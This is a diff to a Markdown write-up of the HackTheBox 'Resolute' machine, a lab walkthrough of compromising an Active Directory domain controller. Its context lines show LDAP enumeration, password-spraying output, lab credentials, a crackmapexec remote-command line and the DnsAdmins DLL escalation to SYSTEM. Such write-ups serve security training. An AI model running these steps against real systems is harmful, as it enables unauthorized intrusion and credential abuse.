@@ -8,6 +8,7 @@ tags:
   - pentest
   - writeup
   - msf
+  - dns
 ---
 
 ---
@@ -16,7 +17,7 @@ tags:
 
 The [Resolute](https://app.hackthebox.com/machines/Resolute) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is a **medium** Windows Machine with a strong focus on Active Directory exploitation. This box was interesting as it showed how to get high privileges using **DnsAdmins** permissions.
 
-If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
+If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
 
 ![image-center](/images/htb/htb_resolute_infocard.png){: .align-center}
 
@@ -32,6 +33,9 @@ This information can then be leveraged by an adversary to aid in other phases of
 ## Scan with Nmap
 
 Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.
+
+**Note:** Always allow a few minutes after the start of an HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.
+{: .notice--info}
 
 ```bash
 $ nmap -sV -Pn 10.129.96.155
@@ -57,7 +61,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
 ```
 
-This computer seems to be a domain controller for **megabank.local**. Let's see if we can extract some users.
+**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
+{: .notice--warning}
+
+As we can see, the output reveals an **LDAP** (TCP/389) port with the **megabank.local** domain name. Let's see if we can extract some users.
 
 ## LDAP
 
@@ -90,7 +97,9 @@ userPrincipalName: simon@megabank.local
 userPrincipalName: naoki@megabank.local
 ```
 
-The *anonymous* bind worked and we got some usernames. Let's dig a bit further, maybe there are interesting things in the **description** field of some of them. In real world scenarios, system administrators frequently store passwords for non-personal accounts in the *description* field of the account. However, this field is readable by all users by default in Active Directory.
+The *anonymous* bind worked and we got some usernames. Let's dig a bit further, maybe there are interesting things in the **description** field of some of them. 
+
+In real world scenarios, system administrators frequently store passwords for non-personal accounts in the *description* field of the account. However, this field is readable by all users by default in Active Directory.
 
 ```bash
 $ ldapsearch -x -b "dc=megabank,dc=local" "*" -H ldap://10.129.96.155 | grep -E 'userPrincipalName|description'
@@ -141,9 +150,6 @@ SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welco
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
 SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\:Welcome123! STATUS_LOGON_FAILURE 
 ```
 
 Great, we now have credentials the **melanie** domain account (`melanie:Welcome123!`). 
@@ -205,7 +211,7 @@ INFO: Done in 00M 04S
 INFO: Compressing output into 20220207140125_bloodhound.zip
 ```
 
-Now, you can import the generated file (*20220207140125_bloodhound.zip*) in BloodHound by running `sudo neo4j console`, then execute BloodHound in another terminal with the `bloodhound` command.
+Now, you can import the generated file (*20220207140125_bloodhound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command.
 
 ## Recon with PrivescCheck
 
@@ -291,7 +297,7 @@ Nice, we found cleartext credentials for **ryan** in the transcript. Maybe this 
 
 ## Domain Compromise with DnsAdmins
 
-According to BloodHound, the user **ryan** is a member of **DnsAdmins**. As stated by this [post](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise), being a member of the DnsAdmins group allows us to use the `dnscmd.exe` to specify a plugin DLL that can be loaded by the DNS service with **SYSTEM** privileges, which means we can do whatever we want !
+According to BloodHound, the user **ryan** is a member of **DnsAdmins**. As stated by this [post](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise), being a member of the DnsAdmins group allows us to use the `dnscmd.exe` to specify a plugin DLL that can be loaded by the DNS service with **SYSTEM** privileges, which means we can do whatever we want!
 
 ![image-center](/images/htb/htb_resolute_bloodhound_ryan.png){: .align-center}
 
@@ -375,7 +381,7 @@ SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Stan
 SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\Administrator:Qwerty1! (Pwn3d!)
 ```
 
-Great, we now have credentials (`administrator:Qwerty1!`) for the **administrator** account. Now we can connect on the remote machine with administrative privileges and read the **second flag**.
+Great, we now have valid credentials for the **administrator** account. Then, we can connect on the remote machine with administrative privileges and read the **second flag**.
 
 ```bash
 $ crackmapexec smb 10.129.96.155 -d megabank.local -u Administrator -p 'Qwerty1!' -x 'dir C:\Users\Administrator\Desktop\'        
@@ -394,4 +400,4 @@ SMB         10.129.96.155   445    RESOLUTE         1 File(s)             34 byt
 SMB         10.129.96.155   445    RESOLUTE         2 Dir(s)   2,475,847,680 bytes free
 ```
 
-Awesome ! I hope you enjoyed it, I know I did :)
+Awesome! I hope you enjoyed it, I know I did :)
